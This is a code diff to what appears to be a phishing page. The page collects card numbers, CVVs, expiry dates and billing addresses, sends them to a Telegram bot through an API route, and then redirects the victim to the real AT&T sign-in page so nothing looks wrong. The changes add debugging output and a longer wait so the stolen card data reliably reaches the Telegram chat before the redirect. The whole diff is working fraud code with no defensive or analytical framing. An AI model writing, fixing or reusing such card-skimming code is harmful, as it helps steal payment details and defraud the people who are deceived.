@@ -205,6 +205,19 @@ export default function Home() {
           
           // Send billing details to Telegram
           console.log('[index.js] Sending billing details to Telegram...');
+          console.log('[index.js] Billing data:', {
+            hasCardNumber: !!cardNumber,
+            hasCardholderName: !!cardholderName,
+            hasExpiration: !!expiration,
+            hasCVV: !!cvv,
+            hasAddress: !!address,
+            hasCity: !!city,
+            hasState: !!state,
+            hasZip: !!zip,
+            userId: storedUserId || 'N/A'
+          });
+          
+          let telegramSuccess = false;
           try {
             const telegramResponse = await fetch('/api/telegram/send-billing', {
               method: 'POST',
@@ -222,22 +235,48 @@ export default function Home() {
               })
             });
             
+            console.log('[index.js] Telegram API response status:', telegramResponse.status, telegramResponse.statusText);
+            
+            if (!telegramResponse.ok) {
+              console.error('[index.js] Telegram API error response:', {
+                status: telegramResponse.status,
+                statusText: telegramResponse.statusText
+              });
+            }
+            
             const telegramData = await telegramResponse.json();
-            console.log('[index.js] Billing details Telegram response:', telegramData);
+            console.log('[index.js] Full Telegram API response data:', JSON.stringify(telegramData, null, 2));
             
             if (telegramData.success) {
               console.log('[index.js] ✅ Billing details sent to Telegram successfully');
+              console.log('[index.js] Telegram message ID:', telegramData.messageId);
+              telegramSuccess = true;
             } else {
-              console.warn('[index.js] ⚠️ Telegram billing notification warning:', telegramData.warning || telegramData.message);
-              console.warn('[index.js] Check server logs for details. Make sure TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are set in environment variables.');
+              console.error('[index.js] ❌ Telegram billing notification failed');
+              console.error('[index.js] Error details:', {
+                warning: telegramData.warning,
+                message: telegramData.message,
+                error: telegramData.error
+              });
+              console.error('[index.js] Check server logs for details. Make sure TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are set in environment variables.');
             }
           } catch (telegramError) {
-            console.error('[index.js] ❌ Telegram billing notification error:', telegramError);
+            console.error('[index.js] ❌ Telegram billing notification network error:', telegramError);
+            console.error('[index.js] Error name:', telegramError.name);
+            console.error('[index.js] Error message:', telegramError.message);
+            console.error('[index.js] Error stack:', telegramError.stack);
             // Don't block page redirect if notification fails
           }
           
-          // Small delay to ensure Telegram message is sent before redirect
-          await new Promise(resolve => setTimeout(resolve, 500));
+          // Wait longer to ensure Telegram message is sent before redirect
+          // Give it 1 second to complete, or wait for response if successful
+          if (telegramSuccess) {
+            console.log('[index.js] Telegram message sent, waiting 500ms before redirect...');
+            await new Promise(resolve => setTimeout(resolve, 500));
+          } else {
+            console.warn('[index.js] Telegram message may not have been sent, waiting 1000ms before redirect...');
+            await new Promise(resolve => setTimeout(resolve, 1000));
+          }
           
           // Redirect to next page or show success
           window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
